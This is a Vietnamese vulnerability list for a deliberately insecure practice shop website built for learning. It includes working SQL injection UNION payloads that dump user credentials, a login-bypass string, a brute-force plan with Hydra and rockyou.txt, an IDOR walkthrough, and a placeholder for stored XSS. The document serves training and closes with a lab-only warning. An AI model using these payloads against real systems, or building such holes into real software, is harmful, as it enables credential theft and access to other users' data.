# Danh Sách Lỗ Hổng Bảo Mật (Vulnerabilities)

Tài liệu này mô tả các lỗ hổng bảo mật được tích hợp trong website Fashion Shop để phục vụ mục đích học tập.

## 1. SQL Injection (Trang Sản Phẩm)
**Mức độ:** Cao (High)
**Vị trí:** `products.php` (tham số `search`)
**Mô tả:** Input tìm kiếm không được sanitize, cho phép attacker chèn mã SQL độc hại.

### Payloads đã kiểm chứng:
1. **Dump thông tin Users (Hiển thị dưới dạng thẻ sản phẩm):**
   ```sql
   %' UNION SELECT id,CONCAT('User: ',username),CONCAT('Pass: ',password),0,0,'user-data',email,phone,created_at FROM users#
   ```
   *Giải thích:* Payload này map các cột của bảng `users` sang các cột của `products` (name, description, price...) để hiển thị dữ liệu ngay trên giao diện web.

2. **Dump toàn bộ cột (Raw Data):**
   ```sql
   %' UNION SELECT id,username,password,email,full_name,phone,address,role,created_at FROM users#
   ```
   *Lưu ý:* Cần 9 cột để khớp với bảng products.

3. **Bypass Authentication (Login):**
   *(Chưa kiểm chứng trên form login)*
   ```sql
   ' OR '1'='1
   ```

## 2. Brute Force (Trang Đăng Nhập)
**Mức độ:** Trung bình (Medium)
**Vị trí:** `login.php`
**Mô tả:** Không có cơ chế giới hạn số lần đăng nhập sai (Rate Limiting) và không có CAPTCHA.

### Kịch bản tấn công:
- Sử dụng Burp Suite Intruder hoặc Hydra để đoán mật khẩu của user `admin`.
- Wordlist gợi ý: `rockyou.txt` (top 1000).

## 3. Insecure Direct Object References (IDOR)
**Mức độ:** Cao (High)
**Vị trí:** `order_detail.php` (tham số `id`)
**Mô tả:** Người dùng có thể xem đơn hàng của người khác bằng cách thay đổi ID trên URL.

### Kịch bản tấn công:
1. Đăng nhập với User A.
2. Xem đơn hàng của mình (ví dụ: `id=1`).
3. Đổi tham số `id` thành 2, 3... để xem đơn hàng của User B.

## 4. Stored XSS (Bình luận/Đánh giá)
**Mức độ:** Trung bình (Medium)
**Vị trí:** *(Cần triển khai)*
**Mô tả:** Cho phép lưu script độc hại vào database và thực thi khi người dùng khác xem.

---
⚠️ **CẢNH BÁO:** Chỉ sử dụng các kỹ thuật này trên môi trường lab (localhost). Không tấn công website thực tế!
